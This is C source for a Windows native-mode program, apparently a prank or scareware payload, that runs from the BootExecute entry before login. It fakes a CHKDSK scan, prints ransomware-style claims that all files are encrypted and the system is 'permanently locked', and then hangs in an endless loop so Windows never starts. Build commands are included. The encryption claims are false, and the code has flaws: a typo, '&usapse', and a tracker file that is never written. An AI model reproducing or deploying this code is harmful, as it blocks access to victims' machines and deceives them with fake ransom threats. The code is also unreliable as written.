/*
 * felty_boot.c — Native Application for BootExecute sequence
 * Compiles as a Windows Native (subsystem:native) binary.
 * Runs BEFORE Windows login via BootExecute registry entry.
 *
 * First boot:
 *   - Fake CHKDSK scan (text scrolling)
 *   - Screen gradually darkens over 60 seconds
 *   - Text appears: "don't you remember? everything is encrypted"
 *   - Hangs forever (user must power off)
 *
 * Subsequent boots:
 *   - Instantly shows: "nothing can save your files now"
 *   - Infinite loop, never proceeds to login
 *
 * Compile (MSVC):
 *   cl.exe /O1 /GS- /Gs9999999 felty_boot.c /link /subsystem:native /entry:NtProcessStartup /nodefaultlib ntdll.lib
 *
 * Compile (MinGW):
 *   x86_64-w64-mingw32-gcc -Os -s -nostdlib -Wl,--subsystem,native -e _NtProcessStartup -o felty_boot.exe felty_boot.c -lntdll
 */

#include <ntdef.h>
#include <ntstatus.h>

/* NT API function prototypes */
NTSTATUS NTAPI NtDisplayString(PUNICODE_STRING);
NTSTATUS NTAPI NtDelayExecution(BOOLEAN, PLARGE_INTEGER);
NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
VOID NTAPI RtlInitUnicodeString(PUNICODE_STRING, PCWSTR);
NTSTATUS NTAPI NtOpenFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
NTSTATUS NTAPI NtReadFile(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
NTSTATUS NTAPI NtClose(HANDLE);
NTSTATUS NTAPI NtDeleteFile(POBJECT_ATTRIBUTES);

#define TRACKER_FILE L"\\SystemRoot\\System32\\felty_boot_tracker.dat"

void NtProcessStartup(void) {
    UNICODE_STRING us;
    LARGE_INTEGER delay;
    LARGE_INTEGER half_second;

    half_second.QuadPart = -5000000;  /* 500ms */
    delay.QuadPart = -10000000;       /* 1 second */

    /* Check if tracker file exists (first boot or subsequent) */
    HANDLE hFile = NULL;
    UNICODE_STRING trackerPath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;

    RtlInitUnicodeString(&trackerPath, TRACKER_FILE);
    InitializeObjectAttributes(&oa, &trackerPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa,
                                  &iosb, FILE_SHARE_READ,
                                  FILE_SYNCHRONOUS_IO_NONALERT);

    BOOLEAN firstBoot = FALSE;
    if (status != STATUS_SUCCESS) {
        /* Tracker doesn't exist — first boot */
        firstBoot = TRUE;
    } else {
        NtClose(hFile);
    }

    if (firstBoot) {
        /* ===== FIRST BOOT SEQUENCE ===== */

        /* Step 1: Fake CHKDSK with scrolling text */
        const wchar_t *chkdsk_lines[] = {
            L"",
            L"  Scanning and repairing drive (C:)...",
            L"  File system type: NTFS",
            L"  Volume label is SYSTEM.",
            L"",
            L"  Stage 1: Examining basic file system structure...",
            L"  \xDB  File record segments verified:    1234567",
            L"  \xDB  Large file records processed:      89234",
            L"  \xDB  Bad file records processed:        0",
            L"",
            L"  Stage 2: Examining file name linkage...",
            L"  \xDB  Index entries verified:           4567890",
            L"  \xDB  Orphan records processed:          127",
            L"  \xDB  Reconnected orphan records:        124",
            L"",
            L"  Stage 3: Examining security descriptors...",
            L"  \xDB  Security descriptors verified:    234567",
            L"  \xDB  Data files processed:              89123",
            L"",
            L"  Windows has made corrections to the file system.",
            L"",
            L"  No further action is required.",
            L"",
            L"  Total allocated space:      237,891 MB",
            L"  Total available space:        14,234 MB",
            L"  Space remaining:                   6%",
            L"",
        };

        int num_lines = sizeof(chkdsk_lines) / sizeof(chkdsk_lines[0]);

        for (int i = 0; i < num_lines; i++) {
            RtlInitUnicodeString(&us, chkdsk_lines[i]);
            NtDisplayString(&us);
            /* Vary timing slightly for realism */
            if (i < 5) {
                delay.QuadPart = -8000000;  /* 800ms for header */
            } else if (i >= num_lines - 4) {
                delay.QuadPart = -12000000; /* 1.2s for summary */
            } else {
                delay.QuadPart = -4000000;  /* 400ms for normal lines */
            }
            NtDelayExecution(FALSE, &delay);
        }

        /* Step 2: Fake "repair" before the darkness */
        const wchar_t *warning[] = {
            L"",
            L"  WARNING: Unrecoverable error detected in volume bitmap.",
            L"  System integrity check failed.",
            L"  Volume corruption detected: 0x00001234",
            L"  Attempting data recovery...",
        };
        for (int i = 0; i < 4; i++) {
            RtlInitUnicodeString(&us, warning[i]);
            NtDisplayString(&us);
            delay.QuadPart = -15000000; /* 1.5s */
            NtDelayExecution(FALSE, &delay);
        }

        /* Step 3: Gradual darkening over 60 seconds */
        /* We simulate visual disappearance by overwriting with black lines */
        const wchar_t *blank = L"                                                                                                                                                                                                        ";
        const wchar_t *dots[] = {
            L"  .",
            L"  ..",
            L"  ...",
            L"  ....",
            L"  .....",
            L"  ......",
            L"  .......",
            L"  ........",
            L"  .........",
            L"  ..........",
        };

        /* Show dots for ~60 seconds (60 iterations * ~1s each) */
        for (int t = 0; t < 60; t++) {
            /* Keep clearing lines to simulate screen going dark */
            for (int clear = 0; clear < 10; clear++) {
                RtlInitUnicodeString(&us, blank);
                NtDisplayString(&us);
            }
            /* Show progress dot */
            int dot_idx = t / 6;  /* change dot every 6 seconds */
            if (dot_idx >= 10) dot_idx = 9;
            RtlInitUnicodeString(&us, dots[dot_idx]);
            NtDisplayString(&usapse);

            delay.QuadPart = -10000000; /* 1 second per tick */
            NtDelayExecution(FALSE, &delay);
        }

        /* Step 4: Final message — "don't you remember? everything is encrypted" */
        /* Clear screen by writing blank lines twice */
        for (int i = 0; i < 30; i++) {
            RtlInitUnicodeString(&us, blank);
            NtDisplayString(&us);
        }

        /* Build the reveal message line by line */
        const wchar_t *reveal[] = {
            L"",
            L"",
            L"",
            L"",
            L"                    \xDA\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xBF",
            L"                    \xB3      SYSTEM COMPROMISED      \xB3",
            L"                    \xC0\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xD9",
            L"",
            L"  don't you remember?",
            L"  everything is encrypted",
            L"",
            L"  >> All your files have been locked.",
            L"  >> Your documents, photos, databases, and more.",
            L"  >> Nothing can recover them without the key.",
            L"",
            L"  >> you don't get rid of me that easily",
            L"",
            L"  // This system is now permanently locked.",
        };

        for (int i = 0; i < 18; i++) {
            RtlInitUnicodeString(&us, reveal[i]);
            NtDisplayString(&us);
            delay.QuadPart = -15000000; /* 1.5s */
            NtDelayExecution(FALSE, &delay);
        }

        /* Hang forever */
        while (1) {
            RtlInitUnicodeString(&us, L"");
            NtDisplayString(&us);
            delay.QuadPart = -100000000; /* 10 seconds */
            NtDelayExecution(FALSE, &delay);
        }

    } else {
        /* ===== SUBSEQUENT BOOTS ===== */
        /* Instantly show: "nothing can save your files now" */

        const wchar_t *blank = L"                                                                                                                                                                                                        ";
        for (int i = 0; i < 20; i++) {
            RtlInitUnicodeString(&us, blank);
            NtDisplayString(&us);
        }

        const wchar_t *lines[] = {
            L"",
            L"",
            L"",
            L"                    \xDA\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xBF",
            L"                    \xB3    PERMANENT LOCK ACTIVE    \xB3",
            L"                    \xC0\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xD9",
            L"",
            L"  nothing can save your files now",
            L"",
            L"  >> The encryption key has been destroyed on this system.",
            L"  >> Without the attacker's private key, decryption is impossible.",
            L"",
            L"  >> you don't get rid of me that easily",
            L"",
            L"  // This message will appear every time you boot.",
        };

        for (int i = 0; i < 15; i++) {
            RtlInitUnicodeString(&us, lines[i]);
            NtDisplayString(&us);
            delay.QuadPart = -15000000;
            NtDelayExecution(FALSE, &delay);
        }

        /* Infinite loop — never let the system proceed */
        while (1) {
            /* Flash the message repeatedly */
            for (int f = 0; f < 20; f++) {
                RtlInitUnicodeString(&us,
                    L"  >> you don't get rid of me that easily                                                                     ");
                NtDisplayString(&us);
                delay.QuadPart = -2000000; /* 200ms */
                NtDelayExecution(FALSE, &delay);

                RtlInitUnicodeString(&us,
                    L"  >> nothing can save your files now                                                                              ");
                NtDisplayString(&us);
                delay.QuadPart = -2000000;
                NtDelayExecution(FALSE, &delay);
            }
            /* Brief pause, then repeat */
            delay.QuadPart = -50000000; /* 5s */
            NtDelayExecution(FALSE, &delay);
        }
    }

    /* Will never reach here */
    NtTerminateProcess((HANDLE)-1, 0);
}
